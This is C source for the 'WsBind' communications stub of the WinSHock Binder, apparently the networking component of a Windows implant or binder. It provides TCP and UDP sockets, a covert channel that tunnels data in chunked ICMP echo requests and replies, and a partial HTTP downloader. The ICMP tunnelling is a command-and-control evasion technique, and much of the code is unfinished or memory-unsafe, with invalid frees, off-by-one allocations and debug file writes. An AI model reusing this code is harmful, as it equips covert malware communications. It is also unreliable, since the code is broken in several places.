// WinSHock Binder (WsBind) Communications Stub
// @idigitalflame

#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "Ws2_32.lib")

typedef struct _IO_STATUS_BLOCK
{
    ULONG_PTR Information;
} IO_STATUS_BLOCK, *PIO_STATUS_BLOCK;
typedef VOID WINAPI (*PIO_APC_ROUTINE)
(
   PVOID ApcContext,
   PIO_STATUS_BLOCK IoStatusBlock,
   ULONG Reserved
);
typedef struct DICMPSOCKET
{
    unsigned char* icmp_buf;
    unsigned long icmp_buf_size;
    unsigned long icmp_buf_read;
    unsigned long icmp_ipv4_addr;
    struct sockaddr_in6 *icmp_ipv6_addr;
} IcmpSocket;
typedef struct DSOCKET
{
    SOCKET sock;
    short sock_type;
    short sock_port;
    char *sock_addr;
    IcmpSocket sock_icmp;
    struct addrinfo sock_info;
} SockData, *PSockData;
typedef DWORD (*nIcmpSendEcho)
(
    HANDLE IcmpHandle,
    IPAddr DestinationAddress,
    LPVOID RequestData,
    WORD RequestSize,
    PIP_OPTION_INFORMATION RequestOptions,
    LPVOID ReplyBuffer,
    DWORD ReplySize,
    DWORD Timeout
);
typedef DWORD (*nIcmp6SendEcho)
(
    HANDLE IcmpHandle,
    HANDLE Event,
    PIO_APC_ROUTINE ApcRoutine,
    PVOID ApcContext,
    struct sockaddr_in6 *SourceAddress,
    struct sockaddr_in6 *DestinationAddress,
    LPVOID RequestData,
    WORD RequestSize,
    PIP_OPTION_INFORMATION RequestOptions,
    LPVOID ReplyBuffer,
    DWORD ReplySize,
    DWORD Timeout
);
typedef HANDLE (*nIcmpCloseFile)
(
    HANDLE IcmpHandle
);
typedef HANDLE (*nIcmpCreateFile)();
typedef HANDLE (*nIcmp6CreateFile)();


WSADATA wsWSData;
PSockData NULL_SOCK;
BOOL wsCommInit = FALSE;
nIcmpSendEcho ICMPSEND = NULL;
nIcmpCloseFile ICMPCLOSE = NULL;
nIcmpCreateFile ICMPCREATE = NULL;
nIcmp6SendEcho ICMP6SEND = NULL;
nIcmp6CreateFile ICMP6CREATE = NULL;

BOOL __wsc_load_icmp_methods();
BOOL __wsc_load_icmp6_methods();
HANDLE wsc_icmp_get_file(BOOLEAN wsIPv6);
SockData wsc_icmp_create(char* wsAddress);
void wsc_icmp_close_file(HANDLE wsIcmpFile);
SockData wsc_socket_create(char* wsAddress, short wsPort, int wsType);
int wsc_writen(SockData *wsSocket, int wsLength, unsigned char* wsData);
int wsc_icmp_send_recv(char* wsAddress, int wsPayloadSize, unsigned char* wsPayload, int wsReceiveSize, unsigned char** wsReceive, BOOL wsChunk);
int __wsc_icmp_sr_resolv(SockData *wsSocket, char* wsAddress, int wsPayloadSize, unsigned char* wsPayload, int wsReceiveSize, unsigned char** wsReceive, BOOL wsChunk);
int __wsc_icmp_sr_raw(HANDLE wsIcmpFile, unsigned long wsAddress4, struct sockaddr_in6 *wsAddress6, int wsPayloadSize, unsigned char* wsPayload, int wsReceiveSize, unsigned char** wsReceive);
int __wsc_icmp_srb_raw(HANDLE wsIcmpFile, unsigned long wsAddress4, struct sockaddr_in6 *wsAddress6, int wsPayloadSize, unsigned char* wsPayload, int wsReceiveSize, unsigned char** wsReceive);

void wsc_init()
{
    if(!wsCommInit)
    {
        WSAStartup(MAKEWORD(2, 2), &wsWSData);
        wsCommInit = TRUE;
    }
}
BOOL __wsc_load_icmp_methods()
{
    if(ICMPSEND != NULL && ICMPCREATE != NULL && ICMPCLOSE != NULL) return TRUE;
    HMODULE wsModule = LoadLibrary("IPHLPAPI.DLL");
    if(wsModule == NULL)
    {
        wsModule = LoadLibrary("ICMP.DLL");
        if(wsModule == NULL) return FALSE;
    }
    ICMPCREATE = (nIcmpCreateFile)GetProcAddress(wsModule, "IcmpCreateFile");
    if(!ICMPCREATE) return FALSE;
    ICMPSEND = (nIcmpSendEcho)GetProcAddress(wsModule, "IcmpSendEcho");
    if(!ICMPSEND) return FALSE;
    ICMPCLOSE = (nIcmpCloseFile)GetProcAddress(wsModule, "IcmpCloseHandle");
    if(!ICMPCLOSE) return FALSE;
    return TRUE;
}
BOOL __wsc_load_icmp6_methods()
{
    if(ICMP6SEND != NULL && ICMP6CREATE != NULL) return TRUE;
    HMODULE wsModule = LoadLibrary("IPHLPAPI.DLL");
    if(wsModule == NULL)
    {
        wsModule = LoadLibrary("ICMP.DLL");
        if(wsModule == NULL) return FALSE;
    }
    ICMP6CREATE = (nIcmp6CreateFile)GetProcAddress(wsModule, "Icmp6CreateFile");
    if(!ICMP6CREATE) return FALSE;
    ICMP6SEND = (nIcmp6SendEcho)GetProcAddress(wsModule, "Icmp6SendEcho2");
    if(!ICMP6SEND) return FALSE;
    return TRUE;
}
HANDLE wsc_icmp_get_file(BOOLEAN wsIPv6)
{
    if(wsIPv6)
    {
        if(!(__wsc_load_icmp6_methods())) return NULL;
        return ICMP6CREATE();
    }
    if(!(__wsc_load_icmp_methods())) return NULL;
    return ICMPCREATE();
}
void wsc_close_sock(SockData *wsSocket)
{
    if(wsSocket->sock_type >= 0 && wsSocket->sock_type < 2)
    {
        closesocket(wsSocket->sock);
        wsSocket->sock = -1;
        free(wsSocket->sock_addr);
    }
}
void wsc_icmp_reset_sock(SockData wsSock)
{
    if(wsSock.sock_addr != NULL && wsSock.sock_icmp.icmp_buf != NULL)
        wsSock.sock_port = 0;
}
SockData wsc_icmp_create(char* wsAddress)
{
	SockData _sock;
	_sock.sock = -1;
    _sock.sock_type = 2;
    _sock.sock_addr = calloc(strlen(wsAddress), 1);
    strncat(_sock.sock_addr, wsAddress, strlen(wsAddress)+1);
    strncat(_sock.sock_addr, "\0", 1);
    _sock.sock_icmp.icmp_buf = calloc(100, 1);
    _sock.sock_icmp.icmp_buf_read = 0;
    _sock.sock_icmp.icmp_buf_size = 100;
	return _sock;
}
void wsc_icmp_close_file(HANDLE wsIcmpFile)
{
    if(__wsc_load_icmp_methods())
        ICMPCLOSE(wsIcmpFile);
}/* --needs work idf
int ws_comm_socket_reconnect(SockData *wsSocket)
{
    if(wsSocket->sock_type == 2) return 1;
    struct addrinfo *wsAddr, *wsAddrCur;
    int wsRet = getaddrinfo(wsSocket->sock_addr, wsSocket->sock_port, &wsSocket->sock_info, &wsAddr);
    if(wsRet != 0)
    {
        WSACleanup();
        wsSocket->sock = -1;
        wsSocket->sock_type = 99;
        return WSB_ERROR_COMM_UNRESOLVED;
    }
    for(wsAddrCur = wsAddr; wsAddrCur != NULL; wsAddrCur = wsAddrCur->ai_next)
    {
        wsSocket->sock = socket(wsAddrCur->ai_family, wsAddrCur->ai_socktype, wsAddrCur->ai_protocol);
        if(wsSocket->sock == INVALID_SOCKET) continue;
        if(connect(wsSocket->sock, wsAddrCur->ai_addr, (int)wsAddrCur->ai_addrlen) != SOCKET_ERROR) break;
        closesocket(wsSocket->sock);
    }
    freeaddrinfo(wsAddr);
    if(wsAddrCur == NULL || wsSocket->sock == INVALID_SOCKET)
    {
        WSACleanup();
        wsSocket->sock = -1;
        wsSocket->sock_type = 99;
        return WSB_ERROR_COMM_NO_RESULTS;
    }
    return 1;
}*/
SockData wsc_udp_create(char* wsAddress, short wsPort)
{
	return wsc_socket_create(wsAddress, wsPort, SOCK_DGRAM);
}
SockData wsc_tcp_create(char* wsAddress, short wsPort)
{
	return wsc_socket_create(wsAddress, wsPort, SOCK_STREAM);
}
int wsc_write(SockData *wsSocket, unsigned char* wsData)
{
    return wsc_writen(wsSocket, strlen(wsData), wsData);
}
SockData wsc_socket_create(char* wsAddress, short wsPort, int wsType)
{
    if(wsType == 2) return wsc_icmp_create(wsAddress);
    char wsPortS[6];
    sprintf(wsPortS, "%u\0", wsPort);
    SockData _sock;
    switch(wsType)
    {
        case SOCK_DGRAM:
            _sock.sock_type = 0;
            break;
        case SOCK_STREAM:
            _sock.sock_type = 1;
            break;
        default:
            _sock.sock_type = 1;
    }
    _sock.sock_port = wsPort;
    _sock.sock_addr = calloc(strlen(wsAddress), 1);
    strncpy(_sock.sock_addr, wsAddress, strlen(wsAddress));
    memset(&_sock.sock_info, 0, sizeof(_sock.sock_info));
    _sock.sock_info.ai_family = PF_UNSPEC;
    _sock.sock_info.ai_socktype = wsType;
    struct addrinfo *wsAddr, *wsAddrCur;
    int wsRet = getaddrinfo(wsAddress, wsPortS, &_sock.sock_info, &wsAddr);
    if(wsRet != 0)
    {
        WSACleanup();
        _sock.sock = -1;
        _sock.sock_type = 99;
        return _sock;
    }
    for(wsAddrCur = wsAddr; wsAddrCur != NULL; wsAddrCur = wsAddrCur->ai_next)
    {
        _sock.sock = socket(wsAddrCur->ai_family, wsAddrCur->ai_socktype, wsAddrCur->ai_protocol);
        if(_sock.sock == INVALID_SOCKET) continue;
        if(connect(_sock.sock, wsAddrCur->ai_addr, (int)wsAddrCur->ai_addrlen) != SOCKET_ERROR) break;
        closesocket(_sock.sock);
    }
    freeaddrinfo(wsAddr);
    if(wsAddrCur == NULL || _sock.sock == INVALID_SOCKET)
    {
        WSACleanup();
        _sock.sock = -1;
        _sock.sock_type = 99;
        return _sock;
    }
    return _sock;
}
int wsc_writen(SockData *wsSocket, int wsLength, unsigned char* wsData)
{
    int wsRet, wsSize = wsLength, wsRecv;
    if(wsSize <= 0) wsSize = strlen(wsData);
    switch(wsSocket->sock_type)
    {
        case 0:
        case 1:
            wsRet = send(wsSocket->sock, wsData, wsSize, 0);
            if(wsRet == SOCKET_ERROR)
                return 0;
            return wsRet;
        case 2:
            wsRecv = (wsSocket->sock_icmp.icmp_buf_size - wsSocket->sock_icmp.icmp_buf_read);
            if((wsSocket->sock_icmp.icmp_buf_size - wsSocket->sock_icmp.icmp_buf_read) < wsSize)
            {
                unsigned char* sockBuf = wsSocket->sock_icmp.icmp_buf;
                if((wsSocket->sock_icmp.icmp_buf = realloc(wsSocket->sock_icmp.icmp_buf, wsSocket->sock_icmp.icmp_buf_size + (wsSize * 2))) == NULL)
                    wsSocket->sock_icmp.icmp_buf = sockBuf;
                else
                {
                    wsSocket->sock_icmp.icmp_buf_size += (wsSize * 2);
                    wsRecv = (wsSocket->sock_icmp.icmp_buf_size - wsSocket->sock_icmp.icmp_buf_read);
                }
                free(sockBuf);
            }
            unsigned char* wsTempStrA = calloc(wsSize, 1);
            wsRet = __wsc_icmp_sr_resolv(wsSocket, NULL, wsSize, wsData, wsSize, &wsTempStrA, TRUE);
            if(wsRet > 0)
            {
                strncpy(wsSocket->sock_icmp.icmp_buf+wsSocket->sock_icmp.icmp_buf_read, wsTempStrA, wsRet);
                wsSocket->sock_icmp.icmp_buf_read += wsRet;
                free(wsTempStrA);
                return wsLength;
            }
            free(wsTempStrA);
            return wsRet;
    }
    return WSB_ERROR_COMM_INVALID_SOCK;
}
int wsc_read(SockData *wsSocket, int wsReadLen, unsigned char* wsBuffer)
{
    int wsRet;
    switch(wsSocket->sock_type)
    {
    	case 0:
    	case 1:
        	wsRet = recv(wsSocket->sock, wsBuffer, wsReadLen, 0);
        	if(wsRet == SOCKET_ERROR)
           		return 0;
        	return wsRet;
        case 2:
            wsRet = wsReadLen;
            if(wsRet > wsSocket->sock_icmp.icmp_buf_read)
                wsRet = wsSocket->sock_icmp.icmp_buf_read;
            strncpy(wsBuffer, wsSocket->sock_icmp.icmp_buf, wsRet);
            if(wsSocket->sock_icmp.icmp_buf_read - wsRet <= 0)
            {
                wsSocket->sock_icmp.icmp_buf_read = 0;
                return wsRet;
            }
            unsigned char* wsTempStrA = calloc(wsSocket->sock_icmp.icmp_buf_read - wsRet, 1);
            strncpy(wsTempStrA, wsSocket->sock_icmp.icmp_buf + wsRet, wsSocket->sock_icmp.icmp_buf_read - wsRet);
            strncpy(wsSocket->sock_icmp.icmp_buf, wsTempStrA, wsSocket->sock_icmp.icmp_buf_read - wsRet);
            wsSocket->sock_icmp.icmp_buf_read -= wsRet;
            free(wsTempStrA);
            return wsRet;
    }
    return 0;
}
int wsc_icmp_send_recv(char* wsAddress, int wsPayloadSize, unsigned char* wsPayload, int wsReceiveSize, unsigned char** wsReceive, BOOL wsChunk)
{
    return __wsc_icmp_sr_resolv(NULL_SOCK, wsAddress, wsPayloadSize, wsPayload, wsReceiveSize, wsReceive, wsChunk);
}
int __wsc_icmp_sr_resolv(SockData *wsSocket, char* wsAddress, int wsPayloadSize, unsigned char* wsPayload, int wsReceiveSize, unsigned char** wsReceive, BOOL wsChunk)
{
    int wsRet, wsResult = 0;
    char *wsIPv4Address;
    unsigned long wsIpv4IPAddr;
    struct sockaddr_in6 *wsSendAddr6;
    struct addrinfo *wsAddr, *wsAddrCur;
    HANDLE wsIcmpFile = NULL;
    if(wsSocket->sock_addr != NULL)
    {
        if(wsSocket->sock_type != 2) return WSB_ERROR_COMM_INVALID_SOCK;
        if(wsSocket->sock_port == 1)
        {
            if(wsSocket->sock_icmp.icmp_ipv4_addr == INADDR_NONE)
                wsIcmpFile = wsc_icmp_get_file(TRUE);
            else
                wsIcmpFile = wsc_icmp_get_file(FALSE);
            if(wsIcmpFile == NULL) return WSB_ERROR_COMM_ICMP_BAD_HANDLE;
            if(wsChunk)
                wsResult = __wsc_icmp_srb_raw(wsIcmpFile, wsSocket->sock_icmp.icmp_ipv4_addr, wsSocket->sock_icmp.icmp_ipv6_addr, wsPayloadSize, wsPayload, wsReceiveSize, wsReceive);
            else
                wsResult = __wsc_icmp_sr_raw(wsIcmpFile, wsSocket->sock_icmp.icmp_ipv4_addr, wsSocket->sock_icmp.icmp_ipv6_addr, wsPayloadSize, wsPayload, wsReceiveSize, wsReceive);
            ICMPCLOSE(wsIcmpFile);
            return wsResult;
        }
        wsRet = getaddrinfo(wsSocket->sock_addr, NULL, NULL, &wsAddr);
    }
    else wsRet = getaddrinfo(wsAddress, NULL, NULL, &wsAddr);
    if(wsRet != 0) return WSB_ERROR_COMM_UNRESOLVED;
    for(wsAddrCur = wsAddr; wsAddrCur != NULL; wsAddrCur = wsAddrCur->ai_next)
    {
        if(wsAddrCur->ai_family == AF_INET6)
        {
            wsSendAddr6 = (struct sockaddr_in6 *)wsAddrCur->ai_addr;
            wsIpv4IPAddr = INADDR_NONE;
            if(wsIcmpFile == NULL)
            {
                wsIcmpFile = wsc_icmp_get_file(TRUE);
                if(wsIcmpFile == NULL) return WSB_ERROR_COMM_ICMP_BAD_HANDLE;
            }
        }
        else if(wsAddrCur->ai_family == AF_INET)
        {
            wsIPv4Address = inet_ntoa(((struct sockaddr_in *)wsAddrCur->ai_addr)->sin_addr);
            wsIpv4IPAddr = inet_addr(wsIPv4Address);
            if(wsIcmpFile == NULL)
            {
                wsIcmpFile = wsc_icmp_get_file(FALSE);
                if(wsIcmpFile == NULL) return WSB_ERROR_COMM_ICMP_BAD_HANDLE;
            }
        }
        if(wsChunk)
        {
            if ((wsResult = __wsc_icmp_srb_raw(wsIcmpFile, wsIpv4IPAddr, wsSendAddr6, wsPayloadSize, wsPayload, wsReceiveSize, wsReceive)) > 0)
                break;
        }
        else
        {
            if ((wsResult = __wsc_icmp_sr_raw(wsIcmpFile, wsIpv4IPAddr, wsSendAddr6, wsPayloadSize, wsPayload, wsReceiveSize, wsReceive)) > 0)
                break;
        }
    }
    if(wsIPv4Address != NULL) free(wsIPv4Address);
    if(wsAddrCur == NULL) return WSB_ERROR_COMM_NO_RESULTS;
    else
    {
        if(wsAddrCur->ai_family == AF_INET6)
        {
            wsSocket->sock_icmp.icmp_ipv6_addr = wsSendAddr6;
            wsSocket->sock_port = 1;
        }
        else if(wsAddrCur->ai_family == AF_INET)
        {
            wsSocket->sock_icmp.icmp_ipv4_addr = wsIpv4IPAddr;
            wsSocket->sock_port = 1;
        }
    }
    freeaddrinfo(wsAddr);
    ICMPCLOSE(wsIcmpFile);
    return wsResult;
}
int __wsc_icmp_sr_raw(HANDLE wsIcmpFile, unsigned long wsAddress4, struct sockaddr_in6 *wsAddress6, int wsPayloadSize, unsigned char* wsPayload, int wsReceiveSize, unsigned char** wsReceive)
{
    int wsDataSize = wsPayloadSize, wsTempA, wsTempB, wsReply;
    if(wsPayloadSize <= 0) wsDataSize = strlen(wsPayload);
    wsReply = sizeof(ICMP_ECHO_REPLY) + wsDataSize;
    LPVOID wsReplyBuf = (VOID*)malloc(wsReply);
    if(wsAddress4 != INADDR_NONE)
        wsTempA = ICMPSEND(wsIcmpFile, wsAddress4, wsPayload, wsDataSize, NULL, wsReplyBuf, wsReply, WSC_ICMP_WAIT_TIME);
    else
        wsTempA = ICMP6SEND(wsIcmpFile, NULL, NULL, NULL, wsAddress6, wsAddress6, wsPayload, wsDataSize, NULL, wsReplyBuf, wsReply, WSC_ICMP_WAIT_TIME);
    if(wsTempA > 0)
    {
        PICMP_ECHO_REPLY wsRepData = (PICMP_ECHO_REPLY)wsReplyBuf;
        wsTempB = wsRepData->DataSize;
        if(wsReceiveSize > 0 && wsReceive != NULL)
        {
            unsigned char *wsString = (unsigned char*)(wsRepData->Data);
            if(wsTempB > wsReceiveSize) wsTempB = wsReceiveSize;
            strncpy(*wsReceive, wsString, wsTempB);
            free(wsString);
        }
        free(wsReplyBuf);
        return wsTempB;
    }
    free(wsReplyBuf);
    return 0;
}
int __wsc_icmp_srb_raw(HANDLE wsIcmpFile, unsigned long wsAddress4, struct sockaddr_in6 *wsAddress6, int wsPayloadSize, unsigned char* wsPayload, int wsReceiveSize, unsigned char** wsReceive)
{
    int wsDataSize = wsPayloadSize, wsTempA, wsTempB, wsTempC, wsCount, wsDataRecv = 0;
    if(wsPayloadSize <= 0) wsDataSize = strlen(wsPayload);
    wsCount = (wsDataSize / WSC_ICMP_CHUNK) + 1;
    unsigned char wsChunkPayload[WSC_ICMP_CHUNK+1], *wsChunkRecv = calloc(WSC_ICMP_CHUNK, 1);
    for(wsTempA = 0; wsTempA < wsCount; wsTempA++)
    {
        if ((wsTempA + 1) * WSC_ICMP_CHUNK > wsDataSize)
        {
            wsTempB = wsDataSize - (wsTempA * WSC_ICMP_CHUNK);
            strncpy(wsChunkPayload, wsPayload + (wsTempA * WSC_ICMP_CHUNK), wsTempB);
            for (; wsTempB < WSC_ICMP_CHUNK; wsTempB++) strncat(wsChunkPayload, "\0", 1);
        }
        else
            strncpy(wsChunkPayload, wsPayload + (wsTempA * WSC_ICMP_CHUNK), WSC_ICMP_CHUNK);
        wsTempC = __wsc_icmp_sr_raw(wsIcmpFile, wsAddress4, wsAddress6, WSC_ICMP_CHUNK, wsChunkPayload, WSC_ICMP_CHUNK, &wsChunkRecv);
        if(wsTempC > 0)
        {
            wsTempB = strlen(wsChunkRecv);;
            if(wsTempB < wsTempC && wsTempB > 0) wsTempC = wsTempB;
            if(wsDataRecv + wsTempC < wsReceiveSize && wsReceiveSize > 0)
            {
                strncat(*wsReceive, wsChunkRecv, wsTempC);
                wsDataRecv += wsTempC;
            }
        }
        memset(&wsChunkPayload, 0, sizeof(wsChunkPayload));
        memset(wsChunkRecv, 0, WSC_ICMP_CHUNK);
    }
    free(wsChunkRecv);
    return wsDataRecv;
}

int __priv_wsc_sock_readfull(SockData wsSocket, unsigned char** wsBuffer)
{
    if(wsSocket.sock == -1) return;
    char wsFiller[101 * 1], *wsBackup;
    int wsPos = 0, wsSize = 100 * 1, wsRead, wsTimeout = 2250;
    setsockopt(wsSocket.sock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&wsTimeout, sizeof(int));
    memset(&wsFiller[0], 0, sizeof(wsFiller));
    *wsBuffer = calloc(100 * 1, 1);

    FILE* pp = fopen("aa.txt", "wb");

    for(;;)
    {
        wsRead = wsc_read(&wsSocket, 100 * 1, wsFiller);
        printf("Read: %d\n", wsRead);

        printf("READ>>%s<<\n", wsFiller);

        fprintf(pp, wsFiller);
        if(wsRead == 0) break;
        if(wsRead + wsPos > wsSize)
        {
            wsBackup = *wsBuffer;
            if((*wsBuffer = realloc(*wsBuffer, wsSize + 100 * (1 * 2))) == NULL)
            {
                *wsBuffer = wsBackup;
                break;
            }
            else
                wsSize += 100 * (1 * 2);
        }
        strncat(*wsBuffer, wsFiller, wsRead);
        wsPos += wsRead;
        memset(&wsFiller[0], 0, sizeof(wsFiller));
    }

    fclose(pp);
    free(pp);

    printf("Bytes red: %d\n", wsPos);

    //if(wsPos < wsSize)
    //    strncat(*wsBuffer, "\0", 1);
    //else
    //    if((*wsBuffer = realloc(*wsBuffer, wsSize + 1)) != NULL)
    //        strncat(*wsBuffer, "\0", 1);
    return wsPos;
}


int ws_comm_http_download_to(char* wsAddress, char* wsSavePath)
{
    // Will work on this soon
}
int ws_comm_http_download(char* wsAddress, char* wsAgent, unsigned char** wsBuffer)
{
    //SockData wsConn = __priv_ws_comm_http_sock(wsAddress, wsAgent);
    //__priv_wsc_sock_readfull(wsConn, &(*wsBuffer));

    return;

    char *wsBufA;
    int wsLen = strlen(*wsBuffer), wsTempA, wsTempB, wsTempC, wsRetVal;
    wsTempB = wsTempC = -1;
    for(wsTempA = 0; wsTempA < wsLen; wsTempA++)
        if((*wsBuffer)[wsTempA] == ' ')
        {
            wsTempB = wsTempA + 1;
            break;
        }
    for(wsTempA = wsTempB; wsTempA < wsLen; wsTempA++)
        if((*wsBuffer)[wsTempA] == ' ')
        {
            wsTempC = wsTempA;
            break;
        }
    if(wsTempB == -1 || wsTempC == -1) return 0;
    wsBufA = calloc(1 + (wsTempC - wsTempB), 1);
    strncpy(wsBufA, *wsBuffer + wsTempB, wsTempC - wsTempB);
    strncat(wsBufA, "\0", 1);
    wsRetVal = atoi(wsBufA);
    free(wsBufA);
    if(wsRetVal == 0) return 0;
    wsTempB = -1;
    for(wsTempA = 0; wsTempA < wsLen; wsTempA++)
        if((*wsBuffer)[wsTempA] == '\r' && (*wsBuffer)[wsTempA+1] == '\n' && (*wsBuffer)[wsTempA+2] == '\r' && (*wsBuffer)[wsTempA+3] == '\n')
        {
            wsTempB = wsTempA + 4;
            break;
        }
    if(wsTempB == -1) return wsRetVal;

    char* vvv = calloc(wsTempB +1, 1);
    strncpy(vvv, *wsBuffer, wsTempB);
    strncat(vvv, "\0", 1);
    printf("[-] dd\n\n%s\n--------", vvv);

    strncpy(*wsBuffer, *wsBuffer + wsTempB, wsLen - wsTempB);
    for(wsTempA = (wsLen-wsTempB); wsTempA < wsLen; wsTempA++)
        (*wsBuffer)[wsTempA] = '\0';
    wsBufA = *wsBuffer;
    if((*wsBuffer = realloc(*wsBuffer, (wsLen - wsTempB) - 1)) != NULL)
        strncat(*wsBuffer, "\0", 1);
    else
        *wsBuffer = wsBufA;



    printf("Orig len: %d, New len: %d, Size of headers: %d\n", wsLen, wsLen-wsTempB, wsTempB);

    return wsRetVal;
}
SockData __priv_wsc_http_sock(char* wsAddress, char* wsAgent)
{
    SockData wsConn;
    char *wsServer, *wsBrowser, *wsBufA, *wsBufB;
    int wsStartPointer = 0, wsEndPointer, wsLen = strlen(wsAddress), wsTempA, wsTempB, wsTempC, wsSSL = 0, wsPort = 80, wsFileStart;
    if (wsLen > 8)
    {
        wsBufA = calloc(wsLen, 1);
        strncpy(wsBufA, wsAddress, wsLen);
        for (wsTempA = 0; wsTempA < 8; wsTempA++) wsBufA[wsTempA] = tolower(wsBufA[wsTempA]);
        if (wsBufA[0] == 'h' && wsBufA[1] == 't' && wsBufA[2] == 't' && wsBufA[3] == 'p')
        {
            wsTempA = 4;
            if (wsBufA[4] == 's')
            {
                wsSSL = 1;
                wsPort = 443;
                wsTempA += 1;
            }
            if (wsBufA[wsTempA] == ':' && wsBufA[wsTempA + 1] == '/' && wsBufA[wsTempA + 2] == '/')
                wsStartPointer = wsTempA + 3;
        }
        free(wsBufA);
    }
    wsTempB = -1;
    for(wsTempA = wsStartPointer; wsTempA < wsLen; wsTempA++)
        if(wsAddress[wsTempA] == ':')
        {
            wsTempB = wsTempA + 1;
            wsEndPointer = wsTempB - 1;
            break;
        }
    if(wsTempB > 0)
    {
        wsTempC = -1;
        for(wsTempA = wsTempB; wsTempA < wsLen; wsTempA++)
            if(wsAddress[wsTempA] == '/')
            {
                wsTempC = wsTempA;
                break;
            }
        if(wsTempC == -1) wsTempC = wsLen;
        wsBufA = calloc(wsTempC - wsTempB, 1);
        strncpy(wsBufA, wsAddress+wsTempB, wsTempC - wsTempB);
        wsPort = atoi(wsBufA);
        wsFileStart = wsTempC;
        free(wsBufA);
    }
    else
    {
        wsFileStart = -1;
        for(wsTempA = wsStartPointer; wsTempA < wsLen; wsTempA++)
            if(wsAddress[wsTempA] == '/')
            {
                wsEndPointer = wsFileStart = wsTempA;
                break;
            }
        if(wsFileStart == -1)
            wsFileStart = wsEndPointer = wsLen;
    }
    if(wsPort <= 0) wsPort = 80;
    wsServer = calloc(1 + (wsEndPointer - wsStartPointer), 1);
    strncpy(wsServer, wsAddress+wsStartPointer, wsEndPointer - wsStartPointer);
    strncat(wsServer, "\0", 1);
    if((wsLen - wsFileStart) == 0)
        wsBufA = "/";
    else
    {
        wsBufA = calloc(1 + (wsLen - wsFileStart), 1);
        strncpy(wsBufA, wsAddress+wsFileStart, wsLen - wsFileStart);
        strncat(wsBufA, "\0", 1);
    }
    if(wsAgent == NULL)
        wsBrowser = "WsBind-HTTP-Agent";
    else
    {
        wsBrowser = calloc(strlen(wsAgent), 1);
        strncpy(wsBrowser, wsAgent, strlen(wsAgent));
    }
    //wsBufB = calloc(67 + strlen(wsBufA) + strlen(wsServer) + strlen(wsBrowser), 1);
    //sprintf(wsBufB, "GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nAccept-Encoding: identity\r\n\r\n\0", wsBufA, wsServer, wsBrowser);

    wsBufB = calloc(40 + strlen(wsBufA) + strlen(wsServer) + strlen(wsBrowser), 1);
    sprintf(wsBufB, "GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\n\r\n\0", wsBufA, wsServer, wsBrowser);

    free(wsBufA);
    printf("[-] Send:\n%s\n", wsBufB);
    free(wsBrowser);
    if(wsSSL == 1)
    {
        // do ssl here
    }
    else
        wsConn = wsc_socket_create(wsServer, (short)wsPort, SOCK_STREAM);
    free(wsServer);
    wsc_write(&wsConn, wsBufB);
    free(wsBufB);
    return wsConn;
}




